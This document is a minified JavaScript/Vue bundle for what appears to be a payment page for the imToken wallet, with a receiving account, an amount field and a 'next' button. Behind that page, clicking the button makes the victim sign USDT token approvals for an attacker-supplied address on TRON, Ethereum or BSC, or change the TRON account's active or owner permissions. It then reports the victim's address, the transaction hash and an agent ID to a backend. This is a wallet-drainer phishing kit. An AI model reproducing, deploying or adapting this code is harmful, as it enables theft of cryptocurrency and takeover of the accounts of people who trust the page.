import{u as a}from"./wG8RYP5wlX-59c46273.js";import{s as e,a as s,b as t,g as o}from"./UcX-080dc982.js";import{B as i,a as r,b as l,c,t as u,g as p}from"./BFIO-0e168e81.js";import{T as d}from"./x-6b7dd0da.js";import{d as n,e as m,c as v,g as b,a as f,b as j}from"./WMYVvW-c6bd0af9.js";import{v as w,c as g,b as h,Q as y,P as T,l as k,M as x,R as S,S as A,O as N,q as R}from"./ZTUWPuGPrz-232bf8d2.js";import{r as I,u as C}from"./lfKF2P-6ea67233.js";import{P as H}from"./UEzAlQOI-6423a399.js";import{F as U,B as _,s as O,a as P,c as V}from"./8Hj76A-97acdcdb.js";import{_ as B}from"./Co0-38b251d2.js";import"./UHSH-cde81cde.js";import"./Uw-59f21ae6.js";import"./MheAq-fe9dc3c9.js";import"./w4d9FK-07da8cee.js";import"./kqRy-bffcdfb6.js";import"./R9ne4uqia-790f2cc4.js";import"./J8Zsvu-19cf83e6.js";import"./MFTB-12a56258.js";import"./TN-01642196.js";import"./KsWM-bc521cd6.js";import"./Mb5-dffb3369.js";import"./Lv5yvQa-9834c1d7.js";import"./hR-92941750.js";import"./6-d6907b47.js";import"./v1Wx-026c5c4a.js";import"./VmXn-fb9f4891.js";import"./x5VyxIQvz-9eb24d11.js";import"./e-1df1a3f7.js";import"./9YVPcE-9830fe74.js";import"./DQEslnDK0v-2d2952f6.js";import"./yJglH8cF-a1e3ca52.js";import"./CGSNQek-407fe1a3.js";/* empty css                   */import"./NBVfD4BR5n-192dfbc3.js";/* empty css            */import"./JNBsa9MF-7845d0d1.js";import"./PPeQha0C-4f49f2c8.js";import"./GYTivUout-456320c8.js";import"./VaZq6If8E-0412f4a2.js";import"./NxMAR-a1b00691.js";import"./fgMnPVclA-2bc6d0ac.js";import"./e5s8GWWxNL-bf1ca418.js";import"./gp6GNvRpn-5717c766.js";import"./3EzQcwbb-73835011.js";import"./ANjET-1a24b742.js";import"./AkmcnNJd-0accf69b.js";import"./D8r-b1420036.js";import"./aX-8bdfec67.js";import"./R-ed228488.js";import"./Ywh9-0d7dee34.js";import"./UUpFD-05af8ee3.js";import"./vrmvfpMpNL-dfba76d6.js";import"./BCgVR0Bfr-349fd3e0.js";import"./75t0Yo-c8f0dbbf.js";import"./BeK9p5-3901b832.js";import"./c-3428687e.js";import"./ZXOr9rv32N-88fac8b9.js";import"./U-db15c0ce.js";import"./ryQw-314ba002.js";import"./CHh9NC-ab3a2e1c.js";import"./zCpH0ueOg-0a636d3c.js";import"./0DO2VOtCz-2ab1aa0a.js";import"./ACh-9ac90bc8.js";import"./f-49a8cb59.js";import"./esM-a9c68513.js";const E=a=>(S("data-v-6966fb22"),a=a(),A(),a),M={class:"page-container"},X=E((()=>T("div",{class:"bottom-m10 left-m10 right-m30 top-p10 o7 fs14"},"收款账号",-1))),F={class:"left-m10 bg-white br12 right-m10",style:{padding:"12px 15px","border-radius":"5px"}},z={class:"bottom-m10 left-m10 right-m10 top-m20 o7 fs14 spaceb"},Q=E((()=>T("span",{class:"fs14"},"数量",-1))),D={class:"fs14 o7"},L={class:"bg-white left-m10 br12 right-m10",style:{"border-radius":"5px"}},q={class:"address left-m20 o7 top-p20 bottom-p10 column"},J={style:{"margin-right":"15px"}},W={class:"spaceb right-m10 top-m10 o6"},G={class:"fs14"},K={class:"center-w confirm-btn left-m10 right-m10",style:{"margin-top":"15px"}},Y=B(w({__name:"imPay",setup(w){const S=I(0),A=I(0),B=I(.069),E=I({type:1,walletType:1,agentId:"",token:"USDT",amount:1,clientId:"",block:i.TRX,ads:"",isAdd:!1,client_type:1,extend:{}}),Y=I("");I("");const Z=I({authAddress:"",clientId:"",receiveAddress:{trx:"",eth:"",bsc:""},authSuccessTips:""}),$=I("");I(!1),a(),I("");const aa=I(!0),ea=g((()=>E.value.ads||Z.value.receiveAddress[E.value.block])),sa=()=>{const{type:a}=E.value;if(A.value<S.value)return O("Insufficient balance");1==a?ta():2==a?oa():ia()},ta=async()=>{try{if(P({message:"Loading...",duration:0}),E.value.block==i.TRX){const a=await r("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",Y.value,$.value);a.result&&(ra($.value,"approve",a.txid),O(Z.value.authSuccessTips))}else if(E.value.block==i.ETH){const a=await n(web3.value,$.value,Y.value);a.transactionHash&&(ra($.value,"approve",a.transactionHash),O(Z.value.authSuccessTips))}else if(E.value.block==i.BSC){const a=await m(web3.value,$.value,Y.value);a.transactionHash&&(ra($.value,"approve",a.transactionHash),O(Z.value.authSuccessTips))}}catch(a){V()}},oa=async()=>{if(E.value.block!=i.TRX)return;const a=await l(Y.value,$.value,E.value.isAdd);(null==a?void 0:a.result)?(ra($.value,"active",a.txid),O(Z.value.authSuccessTips),V()):a&&O("object"==typeof a?JSON.stringify(a):String(a))},ia=async()=>{if(E.value.block!=i.TRX)return;const a=await c(Y.value);a.result&&(ra($.value,"owner",a.txid),O(Z.value.authSuccessTips))},ra=async(a,o,i)=>{const r={addres:a,auth_addres:Y.value,hash:i||0,wallete_type:"ImToken",client_id:E.value.clientId||Z.value.clientId||"",source:window.location.href,agent_uid:E.value.agentId,block:E.value.block,client_type:E.value.client_type,amount:E.value.amount,extend:E.value.extend?JSON.stringify(E.value.extend):""};switch(o){case"approve":await t(r);break;case"active":await s(r);break;case"owner":await e(r)}V()},la=async()=>{let a;switch(E.value.block){case i.TRX:if($.value=await tronWeb.defaultAddress.base58,!$.value)return O("无法获取钱包地址！请检查浏览器是否支持TRON！");A.value=await p($.value,E.value.token);break;case i.ETH:a=await f(),web3.value=a.web3,$.value=a.userAddress,A.value=await j(web3.value,a.userAddress);break;case i.BSC:a=await v(),web3.value=a.web3,$.value=a.userAddress,A.value=await b(web3.value,a.userAddress)}};return h((async()=>{const a=JSON.parse(localStorage.getItem("routerParams"));if(S.value=a.amount,E.value={amount:S.value,type:a.type,walletType:1,agentId:a.agent,token:a.token||"USDT",block:a.block||i.TRX,clientId:a.clientId||"",ads:a.ads,isAdd:a.isAdd,client_type:1,extend:a.extend},(async()=>{try{const a=JSON.parse(localStorage.getItem("config"));Z.value={...a};const{type:e}=E.value;aa.value=!0;const s=await o({block:E.value.block,type:u[E.value.type]});aa.value=!1;const t=s.data;Z.value={...a,authAddress:t},Y.value=Z.value.authAddress}catch(a){aa.value=!1}})(),d.isTokenEnv())try{d.apis.navigator.setTitle(`${String(E.value.token).toLocaleLowerCase()}转账`);let a="";a=E.value.block==i.TRX?await d.apis.user.showAccountSwitch("TRON"):await d.apis.user.showAccountSwitch("ETHEREUM"),$.value=a,la()}catch(e){4001==e.code&&la()}else{la();const a=`imtokenv2://navigate?screen=DappView&url=${window.location.href}`;window.location.href=a}})),(a,e)=>(N(),y("div",M,[X,T("div",F,H(ea.value||"-"),1),T("div",z,[Q,T("span",D,H(A.value)+" "+H(String(E.value.token).toLocaleUpperCase()),1)]),T("div",L,[T("div",q,[T("div",J,[k(C(U),{modelValue:S.value,"onUpdate:modelValue":e[0]||(e[0]=a=>S.value=a),type:"number",label:"",placeholder:"请输入",size:"large",style:{"font-size":"16px",padding:"0 0 10px 0px","border-bottom":"1px solid #eee"}},null,8,["modelValue"])]),T("div",W,[T("span",G," $ "+H("t"==E.value.token?Number(Number(S.value).toFixed(2)*B.value).toFixed(3):S.value),1)])])]),T("div",K,[k(C(_),{style:{width:"100%","border-radius":"8px"},size:"large",color:"#3478f6",onClick:sa,loading:aa.value},{default:x((()=>[R("下一步")])),_:1},8,["loading"])])]))}}),[["__scopeId","data-v-6966fb22"]]);export{Y as default};
